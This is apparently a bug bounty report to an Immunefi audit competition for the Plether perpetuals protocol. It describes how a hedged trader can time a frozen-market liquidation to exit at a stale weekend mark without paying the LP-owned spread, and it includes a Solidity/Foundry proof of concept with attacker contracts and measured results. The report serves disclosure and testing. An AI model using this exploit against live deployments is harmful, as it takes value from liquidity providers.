# \#98340 [SC-Medium] Trader-timed frozen liquidation lets a hedged trader exit at a stale mark, shifting value from LPs

**Submitted on Nov 7th 2026 at 05:00:38 UTC by @tinnohofficial for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98340
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

An actor controlling two trader accounts with opposing positions can keep each above the 3% frozen-market liquidation boundary with `addMargin`, then stop supporting the leg it expects to lose at reopening. Carry makes that leg liquidatable while the oracle still uses Friday's mark. Unlike a voluntary close at that frozen mark, the liquidation is never charged the 50 bp LP-owned frozen-close spread. **An unrelated permissionless keeper can liquidate it and take the keeper reward; the trader still retains a positive residual.** The opposite leg remains open for Sunday's price move. In the release-parameter test with a 50 bp reopen gap and the direction decision made one hour before reopening, the trader gains **8,928.072203 to 8,945.393538 USDG** while LP assets fall **15,736.704363 to 15,737.165698 USDG**. Matched voluntary-close and hold-both controls lose money for the trader. A 25 bp gap also profits if the trader's own keeper wins the reward, but that smaller result is race-sensitive.

### Why this is not the documented design or a known item

[SECURITY.md lines 837–845](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L837-L845) explicitly omit the spread from liquidations to preserve liveness; [ACCOUNTING_SPEC.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L1245-L1251) and [WHITEPAPER.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1070-L1076) agree. The code follows that rule. The unaddressed composition is a **trader-elected, positive-residual liquidation**: the trader can fund both legs until learning which side to discard, then stop funding that side and liquidate it at Friday's mark. The matched controls show that choosing this route changes an unprofitable exit into a profitable one and reduces actual LP assets. Charging only a positive residual would leave zero-residual liquidations live. The project must decide whether this elective route falls within its stated liveness exception.

Known HIGH-1 concerns an already-published Pyth tick at order commitment, not a choice made before the Sunday reopen. MED-7 concerns choosing an older valid signed price; this test installs the final live mark itself. MED-10 concerns basket cap ordering, and MED-30 concerns automatic frozen stop-losses; neither is used here. The profit requires a correct pre-reopen direction decision and, in the 25 bp case, the attacker's keeper capturing the liquidation bounty. This is a conditional strategy, not a guaranteed return.

## Vulnerability Details

### The two exit paths have materially different LP protection

The release has a 50 bp frozen-close spread, 4 bp execution fee, 3% FAD margin, 10 bp liquidation charge, 50% keeper share, 10 bp maximum basket confidence, and a 25% adverse-confidence multiplier ([DEPLOYMENT.md lines 123–147](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L123-L147)). A voluntary frozen close assesses the spread on the reduced notional in addition to its execution fee and signed VPI ([CloseAccountingLib.sol lines 103–126](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L126)). The spread is LP-owned ([SECURITY.md lines 835–845](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L835-L845)).

During an oracle freeze, liquidation instead starts from the stored Engine mark and synthesizes a confidence interval at the configured maximum ratio ([PletherOracle.sol lines 729–743](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L743)). The adverse liquidation shift is 25% of that interval, or 2.5 bp at these settings ([PletherOracle.sol lines 943–964](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L943-L964)). The charge is 10 bp of notional, subject to its collectible cap, and half goes to the keeper ([LiquidationAccountingLib.sol lines 62–78](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/LiquidationAccountingLib.sol#L62-L78)). Price PnL, carry, and any accrued negative-VPI clawback still settle; this is not a free exit. The planner computes a positive residual for the account ([CfdEnginePlanLib.sol lines 1527–1549](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1527-L1549)). Liquidation does not compute a fresh close VPI delta, another documented limitation ([SECURITY.md lines 1434–1442](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1434-L1442)).

### The trader can elect when the frozen liquidation becomes eligible

The frozen oracle reuses the same stored mark until reopening, while carry continues through the freeze ([SECURITY.md line 953](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L953)). Liquidation tests equity against the FAD margin, 300 bp at release ([CfdEnginePlanLib.sol lines 1424–1473](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1424-L1473)). `CfdEngine.addMargin` lets the position owner add margin without a market-status gate, realizing carry and then moving free settlement into active margin ([CfdEngine.sol lines 495–529](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L495-L529)). A sufficiently funded trader can therefore keep both legs safe and stop supporting only the leg it wants liquidated. `executeLiquidation` is permissionless ([OrderRouter.sol lines 486–499](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L486-L499)).

The test opens two positions of 4 million synthetic units each, one LONG and one SHORT, through public V3 orders against a 10 million USDG Junior pool. It splits the LONG open to respect the 40% skew limit; each position is roughly 4 million USDG notional at the $1 mark. It maintains both legs during the live 30-minute FAD lead, then, in one transaction during the final live second, submits a MockPyth feed update and parks both positions just above the frozen liquidation boundary with carry headroom to the decision time. A competing same-second or future-timestamp mark cannot replace it in the test. The frozen mark remains unchanged. This test models an admissible final-second feed update; a real trader needs an available signed update then and must budget for lead-period price movement.

At Sunday 20:00 UTC, one hour before reopening, the trader adds margin to the predicted winning leg and stops topping up the other. Carry makes the losing leg liquidatable 30 minutes later. In the 50 bp comparison an **independent keeper** calls `executeLiquidation` with an empty Pyth payload, collects the liquidation bounty, and leaves the trader profitable. In the 25 bp comparison the trader runs that keeper itself. After the Sunday reopen the winning leg closes at the new live mark. The Friday/Sunday timestamps are real market-calendar dates. A public post-reopen tick cannot choose the loser while retaining frozen pricing, so the attacker needs pre-reopen directional information. Neither the test nor this report establishes how often that information will be correct.

### Why the documented exception is still a candidate issue

The stated liveness rationale is to keep liquidation possible during genuine closures. A position with **positive residual** can contribute an LP stale-exit amount capped by that residual without preventing liquidation or increasing a deficit. The trader-controlled top-up path is the difference from an involuntary liquidation of an undercollateralized trader. In the matched controls the trader can exit voluntarily at the same stale mark, but the 50 bp LP spread and signed close VPI make that trade unprofitable; holding both legs through the reopen is also unprofitable. The elective liquidation changes the trader's decision and produces an actual measured LP asset loss. This is a cross-path economic claim, not an allegation that the documented liquidation calculation is coded incorrectly.

The tested basket stays near 1.0, uses no protection order, and does not depend on the separate VPI reserve/share-timing finding.

## Impact Details

All amounts below are six-decimal USDG. Within each gap/direction comparison, funding, release parameters, mark, and price path are fixed; the voluntary close commits at the same liquidation-eligibility minute and executes one second later. The tests assert conservation across the trader, LP pool, treasury, and independent keeper.

| Reopen gap | Chosen path | Trader net | LP pool net |
| --- | --- | ---: | ---: |
| Up 50 bp, one-hour decision | Liquidate LONG; independent keeper | **+8,928.072203** | **−15,736.704363** |
| Down 50 bp, one-hour decision | Liquidate SHORT; independent keeper | **+8,945.393538** | **−15,737.165698** |
| Up 50 bp | Voluntary frozen close | −15,670.068819 | +9,261.404659 |
| Down 50 bp | Voluntary frozen close | −15,653.666386 | +9,261.402226 |
| Up 50 bp | Hold both legs | −15,761.983009 | +9,345.718369 |
| Down 50 bp | Hold both legs | −15,570.427786 | +9,185.764106 |
| Up 25 bp, one-hour decision | Liquidate LONG; trader's keeper | **+931.832299** | **−5,736.464363** |
| Down 25 bp, one-hour decision | Liquidate SHORT; trader's keeper | **+940.773474** | **−5,737.005698** |
| Up 25 bp | Voluntary frozen close | −25,666.308723 | +19,261.644659 |
| Down 25 bp | Voluntary frozen close | −25,657.826450 | +19,261.562226 |
| Up 25 bp | Hold both legs | −15,713.844131 | +9,305.579683 |
| Down 25 bp | Hold both legs | −15,618.266361 | +9,225.602553 |

In the 50 bp branches the unrelated keeper's total scenario net, including a small common order bounty, is **2,000.600000 USDG** (up) or **2,000.140000 USDG** (down); neither amount is included in the trader net.

Both late-decision variants require substantial capital for two roughly 4 million USDG-notional legs, recurring top-ups, a signed final-second price update, and a correct direction forecast before reopening. The 30-minute threshold crossing depends on the tested carry utilization. The 50 bp result pays the independent keeper about 2,000 USDG and still leaves a trader profit; it is not a claim that every weekend offers a 50 bp gap. At 25 bp the trader captures that keeper reward itself, so a competing keeper can erase the narrow profit. The original Sunday-noon 50 bp comparison and a gap sweep are also reproduced in the PoC.

**Claimed severity: High, theft of LP-owned unclaimed trading revenue and consequential LP asset loss.** The spread is expressly owned by LPs when assessed on voluntary exits, and the positive-residual path makes an equivalent trader-elected stale exit cheaper. If the sponsor accepts the path as harmful but does not treat the avoided charge as unclaimed yield, **Medium** is the fallback. If it treats all trader-timed frozen liquidations as included in the deliberate exception, the report may be rejected as documented design; the tests do not erase that policy objection.

### Recommendation

Apply a frozen stale-exit amount to the **positive residual** of a liquidation, bounded by that residual and credited to LPs, so insolvent and zero-residual liquidations still complete. Test trader-maintained positions at the FAD boundary and both reopen directions. Because this changes the stated liquidation policy, the project should first confirm that elective positive-residual liquidation is outside its intended liveness exception.

## References

- [SECURITY.md: frozen close and liquidation trade-off](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L835-L845)
- [ACCOUNTING_SPEC.md: spread and action matrix](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L1245-L1251)
- [WHITEPAPER.md: frozen liquidation pricing](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1070-L1076)
- [Supplementary deployed-release fork test source](https://gist.github.com/tinnohofficial/d26ee4cf398664b11aeb7ed9ca80ef26). The self-contained local tests below carry the submission's quantified claim; this link retains the previously prepared larger fork reproduction.


## Link to Proof of Concept

https://gist.github.com/tinnohofficial/d26ee4cf398664b11aeb7ed9ca80ef26

## Proof of Concept

# Proof of concept

Save each source below as `packages/perps/test/poc/<file name>`, then run from the repository root at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. All tests use unmodified `packages/perps/src`, release parameters, MockPyth, and mock USDG. Calls use the production V3 `commitOrder` selector and public execution/liquidation; the harness's scalar adapter is unused. Each test ran twice. Excerpts are verbatim but noncontiguous; pass, gas, and scenario lines matched between runs. Amounts are six-decimal USDG atoms.

## Noon 50 bp comparison

```sh
NO_COLOR=1 forge test --root packages/perps --match-path test/poc/TimedFrozenLiquidationExit.t.sol -vv
```

Run 1, selected output:

```text
[PASS] test_CompareBothDirections() (gas: 87979884)
[PASS] test_FinalMarkIsFixedByAttackerTx() (gas: 10820408)
[PASS] test_GapDown_ExitShortBySelfTimedLiquidation() (gas: 13995191)
[PASS] test_GapUp_ExitLongBySelfTimedLiquidation() (gas: 13974938)
Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 117.72ms (156.59ms CPU time)
```

Run 2, same command, matching scenario lines:

```text
Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 137.50ms (212.96ms CPU time)
```

### `TimedFrozenLiquidationExit.t.sol` — complete source

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Minimal smart-account trader leg (any AA/contract wallet). The owner is the attacker; the operator is the
///         attacker's own parking contract, so both legs can be topped up inside one transaction.
contract ParkedLeg {

    address public immutable owner;
    address public operator;

    constructor(
        address owner_
    ) {
        owner = owner_;
    }

    function setOperator(
        address operator_
    ) external {
        require(msg.sender == owner, "owner");
        operator = operator_;
    }

    function exec(
        address target,
        bytes calldata data
    ) external returns (bytes memory ret) {
        require(msg.sender == owner || msg.sender == operator, "auth");
        bool ok;
        (ok, ret) = target.call(data);
        if (!ok) {
            assembly ("memory-safe") {
                revert(add(ret, 32), mload(ret))
            }
        }
    }

}

interface IMarkRouter {

    function updateMarkPrice(
        bytes[] calldata pythUpdateData
    ) external payable;

}

/// @notice Attacker contract. In ONE transaction during the last live second it (1) pushes the final pre-freeze
///         basket as an ordinary permissionless keeper, with publishTime == block.timestamp, so no later live mark can
///         exist, and (2) reads that final mark on-chain and tops each leg up to the FROZEN FAD boundary (mark +/- the
///         synthesized frozen confidence shift, 3% margin) plus `keep[i]` of carry headroom. addMargin can only add,
///         so a leg that already sits above the target is left untouched and the amount is reported as zero.
contract Parker {

    function pushAndPark(
        address router,
        PletherOracle oracle,
        CfdEngine engine,
        CfdEngineLens lens,
        bytes[] calldata update,
        ParkedLeg[] calldata legs,
        uint256[] calldata keep,
        uint256 fadBps
    ) external returns (uint256[] memory added) {
        IMarkRouter(router).updateMarkPrice(update);
        uint256 mark = engine.lastMarkPrice();
        uint256 shift =
            ((mark * oracle.basketMaxConfidenceRatioBps()) / 10_000) * oracle.adverseConfidenceMultiplierBps() / 10_000;
        added = new uint256[](legs.length);
        for (uint256 i; i < legs.length; ++i) {
            address acct = address(legs[i]);
            (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(acct);
            uint256 liq = side == CfdTypes.Side.LONG ? mark + shift : mark - shift;
            int256 equity = lens.previewLiquidation(acct, liq).equityAssets;
            int256 target = int256((size / 1e20) * liq * fadBps / 10_000 + keep[i] + 1);
            if (equity < target) {
                added[i] = uint256(target - equity);
                legs[i].exec(address(engine), abi.encodeCall(CfdEngine.addMargin, (acct, added[i])));
            }
        }
    }

}

/// @notice Self-timed frozen liquidation bypasses the frozen-close spread: atomic parking, both directions.
///         Covers three timing and direction constraints:
///         (1) final-mark jitter: the attacker itself pushes the last live mark with publishTime == block.timestamp in
///             the last live second and parks both legs in the same transaction; the test proves no other keeper can
///             replace that mark (same-second replacement and future publish times revert; post-freeze updates are
///             ignored).
///         (2) FAD-lead price drift: the basket moves during the 30-minute FAD lead and the attacker only tops up the
///             losing leg; the drift-induced excess is absorbed because the frozen liquidation price is 2.5 bp more
///             adverse than the live one, so both legs can still be parked exactly.
///         (3) "only one leg works": the weekend switch is exercised in BOTH directions (exit LONG on a gap up, exit
///             SHORT on a gap down) with the same parking.
///         Larger legs (4M per side on a 10M Junior pool, opened in two steps to respect the 40% skew cap) also raise
///         utilization, i.e. carry speed, and enlarge the bypassed spread/fee/VPI.
contract TimedFrozenLiquidationExitTest is BasePerpTest {

    address internal constant KEEPER = address(0x4EE9E7); // independent keeper
    address internal constant OTHER_KEEPER = address(0x0BAD5EED); // competing keeper trying to move the final mark
    address internal constant SELF_KEEPER = address(0x5E1F); // attacker-owned keeper EOA

    // Friday 2024-10-18 20:29:59 UTC = 16:29:59 EDT (one second before FAD). Same anchor as OracleRegimeMatrix.
    uint256 internal constant BEFORE_FAD = 1_729_283_399;
    uint256 internal constant FREEZE = BEFORE_FAD + 1801; // 21:00:00 UTC = 17:00 EDT
    uint256 internal constant LAST_SECOND = FREEZE - 1; // 20:59:59 UTC, last live second
    uint256 internal constant DECISION = FREEZE + 39 hours; // Sunday 12:00 UTC
    uint256 internal constant REOPEN = FREEZE + 2 days; // Sunday 21:00 UTC = 17:00 EDT

    uint256 internal constant LEG = 4_000_000e18;
    uint256 internal constant HALF = 2_000_000e18;
    uint256 internal constant FUND = 300_000e6;
    uint256 internal constant CUSHION = 300e6; // live keep-alive cushion during the FAD lead (0.75 bp of 4M)
    uint256 internal constant FINAL_PRICE = 100_002_000; // final pre-freeze basket 1.00002
    uint256 internal constant GAP_BPS = 50; // Sunday reopen gap, 0.50%

    uint8 internal constant MODE_ATTACK = 0;
    uint8 internal constant MODE_VOLUNTARY = 1;
    uint8 internal constant MODE_HOLD = 2;

    ParkedLeg internal legA; // LONG
    ParkedLeg internal legB; // SHORT
    Parker internal parker;

    struct Outcome {
        uint256 loserExitCost;
        int256 attackerNet;
        int256 lpNet;
        int256 treasuryNet;
        int256 keeperNet;
        uint256 minutesToCross;
        uint256 parkedA;
        uint256 parkedB;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // packages/perps/DEPLOYMENT.md "Initial release parameters".
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory cfg = _routerConfig();
        cfg.basketMaxConfidenceRatioBps = 10;
        cfg.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(cfg);
        legA = new ParkedLeg(address(this));
        legB = new ParkedLeg(address(this));
        parker = new Parker();
        legA.setOperator(address(parker));
        legB.setOperator(address(parker));
    }

    // ------------------------------------------------------------------ tests

    /// @notice The attacker-pushed last-second mark cannot be replaced by anyone.
    function test_FinalMarkIsFixedByAttackerTx() public {
        _setupThroughFinalPark(true);
        assertEq(engine.lastMarkTime(), LAST_SECOND, "attacker mark time");
        assertEq(engine.lastMarkPrice(), FINAL_PRICE, "attacker mark price");
    }

    function test_GapUp_ExitLongBySelfTimedLiquidation() public {
        Outcome memory o = _run(MODE_ATTACK, true);
        _log("ATTACK gap UP (exit LONG A by self-timed frozen liquidation)", o);
        assertGt(o.attackerNet, 0);
    }

    function test_GapDown_ExitShortBySelfTimedLiquidation() public {
        Outcome memory o = _run(MODE_ATTACK, false);
        _log("ATTACK gap DOWN (exit SHORT B by self-timed frozen liquidation)", o);
        assertGt(o.attackerNet, 0);
    }

    function test_CompareBothDirections() public {
        for (uint256 d; d < 2; ++d) {
            bool up = d == 0;
            uint256 s = vm.snapshotState();
            Outcome memory attack = _run(MODE_ATTACK, up);
            vm.revertToState(s);
            Outcome memory vol = _run(MODE_VOLUNTARY, up);
            vm.revertToState(s);
            Outcome memory hold = _run(MODE_HOLD, up);
            vm.revertToState(s);
            console2.log(up ? "=== reopen gap UP 50 bp: loser = LONG A" : "=== reopen gap DOWN 50 bp: loser = SHORT B");
            _log("ATTACK self-timed frozen liquidation (own keeper)", attack);
            _log("CONTROL voluntary frozen close", vol);
            _log("CONTROL hold both through reopen", hold);
            console2.log("  extra LP loss vs voluntary path (USDG atoms)", uint256(vol.lpNet - attack.lpNet));
            console2.log("  loser exit cost saved (USDG atoms)          ", vol.loserExitCost - attack.loserExitCost);
            assertGt(attack.attackerNet, 0, "liquidation branch profitable at 50 bp");
            assertLt(vol.attackerNet, 0, "voluntary close branch unprofitable at 50 bp");
            assertLt(hold.attackerNet, 0, "holding unprofitable");
            assertLt(attack.lpNet, vol.lpNet, "LPs lose more on the liquidation branch");
            assertLt(attack.lpNet, 0, "LPs lose on the liquidation branch");
        }
    }

    // ------------------------------------------------------------------ scenario

    /// @dev Opens the straddle, runs a drifting FAD lead with keep-alive top-ups, and executes the attacker's
    ///      one-transaction push-and-park in the last live second. Returns pool/treasury/keeper baselines.
    function _setupThroughFinalPark(
        bool proveFinality
    ) internal returns (uint256 poolBefore, uint256 treasuryBefore, uint256 keeperBefore, uint256[] memory added) {
        // Thursday: fund and open 4M LONG (A) and 4M SHORT (B); A is opened in two halves to respect the 40% skew cap.
        _go(BEFORE_FAD - 1 days);
        _refresh(1e8);
        _fundTrader(address(legA), FUND);
        _fundTrader(address(legB), FUND);
        poolBefore = pool.totalAssets();
        treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        keeperBefore = clearinghouse.balanceAssets(KEEPER);
        _openLeg(address(legA), CfdTypes.Side.LONG, HALF, 10_000e6);
        _openLeg(address(legB), CfdTypes.Side.SHORT, LEG, 20_000e6);
        _openLeg(address(legA), CfdTypes.Side.LONG, HALF, 10_000e6);
        (uint256 sa,,,,,,) = engine.positions(address(legA));
        (uint256 sb,,,,,,) = engine.positions(address(legB));
        assertEq(sa, LEG, "A open");
        assertEq(sb, LEG, "B open");

        // FAD lead (live prices, 3% margin). The basket drifts; after each tick the attacker re-tops the losing leg to
        // the LIVE boundary + cushion. Neither leg is ever liquidatable, so third-party keepers cannot act.
        uint256[4] memory path = [uint256(1e8), 100_006_000, 99_996_000, 100_001_000];
        for (uint256 i; i < path.length; ++i) {
            _go(BEFORE_FAD + i * 540);
            _refresh(path[i]);
            assertFalse(_liveLiquidatable(address(legA), path[i]), "A safe in lead");
            assertFalse(_liveLiquidatable(address(legB), path[i]), "B safe in lead");
            _keepAliveLive(address(legA), path[i]);
            _keepAliveLive(address(legB), path[i]);
        }

        // Last live second: the attacker's single transaction pushes the final basket and parks both legs on the
        // frozen boundary with carry headroom until the decision time (headroom computed off-chain beforehand).
        _go(LAST_SECOND);
        uint256[] memory keep = new uint256[](2);
        keep[0] = _carryBetween(address(legA), CfdTypes.Side.LONG, LAST_SECOND, DECISION);
        keep[1] = _carryBetween(address(legB), CfdTypes.Side.SHORT, LAST_SECOND, DECISION);
        ParkedLeg[] memory legs = new ParkedLeg[](2);
        legs[0] = legA;
        legs[1] = legB;
        bytes[] memory fin = _tick(FINAL_PRICE, uint64(LAST_SECOND), uint64(LAST_SECOND - 1));
        added = parker.pushAndPark(address(router), pletherOracle, engine, engineLens, fin, legs, keep, 300);
        console2.log("  carry headroom to decision A / B (USDG atoms)", keep[0], keep[1]);
        console2.log("  one-tx park top-up A / B (USDG atoms)       ", added[0], added[1]);
        assertGt(added[0], 0, "A needed a top-up: lead excess absorbed by the frozen shift");
        assertGt(added[1], 0, "B needed a top-up: lead excess absorbed by the frozen shift");

        if (proveFinality) {
            // Same second: a competing keeper cannot replace the final mark with a different price ...
            vm.prank(OTHER_KEEPER);
            vm.expectRevert();
            router.updateMarkPrice(_payload(FINAL_PRICE - 3000, uint64(LAST_SECOND), uint64(LAST_SECOND - 1)));
            // ... and cannot use a newer publish time while block.timestamp is still the last live second.
            vm.prank(OTHER_KEEPER);
            vm.expectRevert();
            router.updateMarkPrice(_payload(FINAL_PRICE - 3000, uint64(FREEZE), uint64(LAST_SECOND)));
            // After 17:00:00 New York the oracle is frozen: any update is ignored (or rejected); the mark is final.
            _go(FREEZE + 1);
            vm.prank(OTHER_KEEPER);
            try router.updateMarkPrice(_payload(FINAL_PRICE - 3000, uint64(FREEZE + 1), uint64(FREEZE))) {} catch {}
            assertEq(engine.lastMarkPrice(), FINAL_PRICE, "frozen mark unchanged");
            assertEq(engine.lastMarkTime(), LAST_SECOND, "frozen mark time unchanged");
            console2.log("  final mark fixed by attacker tx; competing keeper updates rejected/ignored");
        }
    }

    function _run(
        uint8 mode,
        bool gapUp
    ) internal returns (Outcome memory o) {
        (uint256 poolBefore, uint256 treasuryBefore, uint256 keeperBefore, uint256[] memory added) =
            _setupThroughFinalPark(false);
        o.parkedA = added[0];
        o.parkedB = added[1];

        // Freeze: neither leg is liquidatable (third-party keepers cannot act) and the switch budget is measured.
        _go(FREEZE + 10);
        assertTrue(engine.isOracleFrozen() && engine.isFadWindow(), "frozen");
        assertFalse(_liquidatable(address(legA), CfdTypes.Side.LONG), "A healthy at freeze");
        assertFalse(_liquidatable(address(legB), CfdTypes.Side.SHORT), "B healthy at freeze");
        uint256 budgetA = _carryBetween(address(legA), CfdTypes.Side.LONG, FREEZE + 10, REOPEN - 1);
        console2.log("  switch budget A: carry freeze->reopen (USDG atoms; in 0.01 bp of 4M)", budgetA, budgetA / 4_000_000);

        // Decision time: weekend information says which way the reopen gaps.
        _go(DECISION);
        assertFalse(_liquidatable(address(legA), CfdTypes.Side.LONG), "A healthy at decision");
        assertFalse(_liquidatable(address(legB), CfdTypes.Side.SHORT), "B healthy at decision");
        address loser = gapUp ? address(legA) : address(legB);
        address winner = gapUp ? address(legB) : address(legA);
        CfdTypes.Side loserSide = gapUp ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT;
        CfdTypes.Side winnerSide = gapUp ? CfdTypes.Side.SHORT : CfdTypes.Side.LONG;
        vm.prank(winner);
        engine.addMargin(winner, 40_000e6); // keep the winner alive through the reopen
        uint256 loserBefore = clearinghouse.balanceAssets(loser);

        if (mode == MODE_ATTACK) {
            uint256 t = DECISION;
            while (!_liquidatable(loser, loserSide)) {
                t += 30 minutes;
                require(t < REOPEN, "loser did not cross before reopen");
                _go(t);
            }
            o.minutesToCross = (t - DECISION) / 60;
            int256 equity = engineLens.previewLiquidation(loser, _liqPrice(loserSide)).equityAssets;
            uint256 charge = engineLens.previewLiquidation(loser, _liqPrice(loserSide)).liquidationChargeAssets;
            assertGt(equity, int256(charge), "positive liquidation residual");
            vm.prank(SELF_KEEPER);
            router.executeLiquidation(loser, new bytes[](0)); // frozen: stale mark + 2.5 bp shift
            (uint256 sl,,,,,,) = engine.positions(loser);
            assertEq(sl, 0, "loser liquidated at the stale mark");
        } else if (mode == MODE_VOLUNTARY) {
            _go(DECISION + 30 minutes); // compare the same frozen exit minute as liquidation
            o.minutesToCross = 30;
            assertTrue(_liquidatable(loser, loserSide), "control: same eligibility time");
            OrderV3Types.OrderRequest memory request = _orderRequest(loserSide, LEG, 0, true);
            vm.prank(loser);
            uint64 id = router.commitOrder(request);
            uint64 cc = uint64(vm.getBlockTimestamp());
            _go(cc + 1);
            bytes[] memory px = _tick(FINAL_PRICE, cc + 1, cc); // built before the prank (setAllPrices is a call)
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory r = router.executeOrder(id, px);
            assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "frozen close executed");
            (uint256 sl,,,,,,) = engine.positions(loser);
            assertEq(sl, 0, "loser closed at stale mark + spread");
        } else {
            vm.prank(loser);
            engine.addMargin(loser, 40_000e6);
        }
        if (mode != MODE_HOLD) {
            o.loserExitCost = loserBefore - clearinghouse.balanceAssets(loser);
        }

        // Sunday reopen: first live tick carries the gap; the surviving leg(s) close through the Router.
        _go(REOPEN + 5);
        assertFalse(engine.isOracleFrozen(), "live again");
        uint256 gapPrice =
            gapUp ? FINAL_PRICE * (10_000 + GAP_BPS) / 10_000 : FINAL_PRICE * (10_000 - GAP_BPS) / 10_000;
        _refresh(gapPrice);
        _closeLeg(winner, winnerSide, gapPrice);
        if (mode == MODE_HOLD) {
            _closeLeg(loser, loserSide, gapPrice);
        }

        uint256 attackerFinal = clearinghouse.balanceAssets(address(legA)) + clearinghouse.balanceAssets(address(legB))
            + engine.traderClaimBalanceAssets(address(legA)) + engine.traderClaimBalanceAssets(address(legB))
            + clearinghouse.balanceAssets(SELF_KEEPER);
        o.attackerNet = int256(attackerFinal) - int256(2 * FUND);
        o.lpNet = int256(pool.totalAssets()) - int256(poolBefore);
        o.treasuryNet = int256(clearinghouse.balanceAssets(engine.protocolTreasury())) - int256(treasuryBefore);
        o.keeperNet = int256(clearinghouse.balanceAssets(KEEPER)) - int256(keeperBefore);
        // Closed system: attacker + LPs + treasury + independent keeper sum to zero.
        assertEq(o.attackerNet + o.lpNet + o.treasuryNet + o.keeperNet, 0, "conservation");
    }

    // ------------------------------------------------------------------ helpers

    function _go(
        uint256 t
    ) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _payload(
        uint256 price,
        uint64 publishTime,
        uint64 prevPublishTime
    ) internal pure returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            u[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, int32(-8), publishTime, prevPublishTime)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(u);
    }

    function _tick(
        uint256 price,
        uint64 publishTime,
        uint64 prevPublishTime
    ) internal returns (bytes[] memory data) {
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), int32(-8), uint256(publishTime));
        data = _payload(price, publishTime, prevPublishTime);
    }

    function _refresh(
        uint256 price
    ) internal {
        uint64 t = uint64(vm.getBlockTimestamp());
        bytes[] memory d = _tick(price, t, t - 1);
        vm.prank(KEEPER);
        router.updateMarkPrice(d);
    }

